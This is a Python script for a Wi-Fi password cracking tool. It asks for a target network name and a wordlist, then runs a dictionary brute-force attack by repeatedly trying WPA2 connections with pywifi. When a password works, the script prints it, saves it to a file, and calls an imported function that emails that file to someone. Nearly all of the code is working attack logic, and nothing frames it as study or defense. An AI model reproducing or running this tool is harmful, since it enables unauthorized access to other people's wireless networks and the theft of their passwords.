# Importing General Libraries
import argparse
from logo import wifi_shape
import os, os.path, platform
import time
import comtypes
from wordlist import generate_wordlist
from createFile import create_file
from sendEmail import send_emails

# Importing pywifi library
import pywifi
from pywifi import PyWiFi
from pywifi import const
from pywifi import Profile

# color codes
RED = "\033[1;31m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD = "\033[;1m"
REVERSE = "\033[;7m"
YELLOW = '\033[93m'
ORANGE = '\033[33m'


# the start of the script
wifi_shape()
print(YELLOW)
client_ssid = input("Enter the name of the targeted Wi-Fi : ")
option = input("Do you want to create a customized wordlist? (y/n) : ")
if option.lower() == 'y' or option.lower() == 'yes':
    path_to_file = str(generate_wordlist())
else:
    path_to_file = r"words.txt"


try:
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]  # Collect the available wlan interfaces

    ifaces.scan()  # a method to trigger the wi-fi interface to scan
    results = ifaces.scan_results()  # Return the scan result

    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]  # Collect the available wlan interfaces
except Exception as ex:
    print("[-] Error system", ex)


def main(ssid, password, number):
    # Defining Wi-Fi Profile (info needed to connect)
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    profile.key = password
    iface.remove_all_network_profiles()  # Remove all the settings
    tmp_profile = iface.add_network_profile(profile)  # add the info needed to connect
    time.sleep(0.1)
    iface.connect(tmp_profile)  # attempt to connect
    time.sleep(0.35)

    if ifaces.status() == const.IFACE_CONNECTED:  # check if the crack is successful
        # the attempt is successful
        time.sleep(1)
        print(BOLD, GREEN, '\n -- CRACKING ACCOMPLISHED !', RESET)
        print(BOLD, GREEN, ' -- wi-fi password is', BOLD, ORANGE, password, RESET)
        create_file(ssid, password)  # file contains the details of the wi-fi attack
        send_emails()  # send the previous file to an email
        time.sleep(1)
        exit()
    else:
        # failed attempts
        print(RED, '[{}] Crack Failed using {}'.format(number, password))


def pwd(ssid, file):  # performing brute force / dictionary attack using wordlist
    number = 0
    with open(file, 'r', encoding='utf8') as words:
        for line in words:
            number += 1
            line = line.split("\n")
            pwd = line[0]
            main(ssid, pwd, number)


def menu(client_ssid, path_to_file):
    # Argument Parser for making cmd interactive
    parser = argparse.ArgumentParser(description='argparse Example')

    # adding arguments
    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='keywords list ...')

    print()

    args = parser.parse_args()
    time.sleep(1.5)

    # taking wordlist and ssid if given else take default
    if args.wordlist and args.ssid:
        ssid = args.ssid
        filee = args.wordlist
    else:
        print(BLUE)
        ssid = client_ssid
        filee = path_to_file

        # breaking
    if os.path.exists(filee):
        if platform.system().startswith("Win" or "win"):
            os.system("cls")
        else:
            os.system("clear")
        print(BLUE, " Wi-Fi CRACKING IN PROGRESS ...")
        pwd(ssid, filee)
    else:
        print(RED, "[-] No Such File.", BLUE)


# Main function call
menu(client_ssid, path_to_file)
